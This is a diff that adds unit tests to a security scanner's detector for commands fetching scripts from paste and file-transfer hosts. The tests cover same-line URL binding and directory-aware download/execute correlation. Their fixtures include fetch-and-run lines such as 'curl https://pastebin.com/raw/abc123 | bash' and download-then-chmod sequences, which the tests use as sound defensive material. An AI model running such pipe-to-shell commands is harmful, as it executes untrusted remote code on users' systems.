@@ -145,4 +145,76 @@ describe('SMI-6033 Wave 3 paste/snippet-host reputation (paste_host_fetch)', () 
     expect(f.length).toBeGreaterThan(0)
     expect(f.every((x) => x.severity === 'low')).toBe(true)
   })
+
+  // SMI-6033 Wave 3 (adversarial-review fix): the "is this URL fetched?" gate
+  // used to be a bare FETCH_COMMAND_PATTERN test against the whole LINE, so a
+  // fetch verb ANYWHERE on the line bound an unrelated paste-host URL to it.
+  describe('same-line fetch-target binding (SMI-6033 Wave 3)', () => {
+    it('FP: a paste-host URL merely mentioned after an unrelated fetch on the same line is NOT a fetch target (no finding), even with execution evidence present', () => {
+      // `curl` fetches example.com/setup.sh; the pastebin URL is prose after a
+      // `;`. Before the fix the line-wide fetch-verb test bound the pastebin
+      // URL to that curl, and the (real, unrelated) `chmod +x setup.sh`
+      // correlation supplied "execution evidence" — producing a
+      // standalone-CRITICAL paste_host_fetch on a benign mention.
+      const content = [
+        'curl -o setup.sh https://example.com/setup.sh; see the mirror at https://pastebin.com/abc123',
+        'chmod +x setup.sh',
+      ].join('\n')
+      expect(phf(scanner.scan('t', content).findings)).toHaveLength(0)
+    })
+
+    it('FP: a transfer-host URL mentioned after an unrelated `curl --version` on the same line produces no finding', () => {
+      // The TRANSIENT tier needs no execution evidence at all, so the line-wide
+      // gate produced a spurious medium finding here on its own.
+      const content = 'curl --version; the reproducer mirror lives at https://transfer.sh/abc123'
+      expect(phf(scanner.scan('t', content).findings)).toHaveLength(0)
+    })
+
+    it('TP control: the same paste-host URL as the ACTUAL curl argument still fires standalone-critical', () => {
+      const content = ['curl -o setup.sh https://pastebin.com/abc123', 'chmod +x setup.sh'].join(
+        '\n'
+      )
+      const f = phf(scanner.scan('t', content).findings)
+      expect(f.length).toBeGreaterThan(0)
+      expect(f[0].severity).toBe('critical')
+    })
+
+    it('TP control: a chained command (`cd /tmp && curl <url> | bash`) still binds — a separator bounds the search, it does not disqualify the line', () => {
+      const content = 'cd /tmp && curl https://pastebin.com/raw/abc123 | bash'
+      const f = phf(scanner.scan('t', content).findings)
+      expect(f.length).toBeGreaterThan(0)
+      expect(f[0].severity).toBe('critical')
+    })
+
+    it('TP control: markdown/shell decoration before the verb still binds (`- Run: `curl <url> | bash``)', () => {
+      const content = '- Run: `curl https://pastebin.com/raw/abc123 | bash`'
+      const f = phf(scanner.scan('t', content).findings)
+      expect(f.length).toBeGreaterThan(0)
+      expect(f.every((x) => x.severity === 'critical' || x.severity === 'low')).toBe(true)
+    })
+  })
+
+  // SMI-6033 Wave 3 (adversarial-review fix): the shared fetch-correlation
+  // utility is now directory-path-aware, so this detector's
+  // "fetch-destination executed elsewhere" evidence no longer accepts a
+  // coincidental basename collision between two unrelated files.
+  describe('directory-aware fetch-destination correlation (SMI-6033 Wave 3)', () => {
+    it('FP: a same-named file in a DIFFERENT directory is not execution evidence (no finding)', () => {
+      const content = [
+        'curl -o /tmp/installer.sh https://pastebin.com/raw/foo',
+        'chmod +x ./vendor/other-tool/installer.sh',
+      ].join('\n')
+      expect(phf(scanner.scan('t', content).findings)).toHaveLength(0)
+    })
+
+    it('TP control: the SAME directory on both sides is execution evidence (critical)', () => {
+      const content = [
+        'curl -o /tmp/installer.sh https://pastebin.com/raw/foo',
+        'chmod +x /tmp/installer.sh',
+      ].join('\n')
+      const f = phf(scanner.scan('t', content).findings)
+      expect(f.length).toBeGreaterThan(0)
+      expect(f[0].severity).toBe('critical')
+    })
+  })
 })
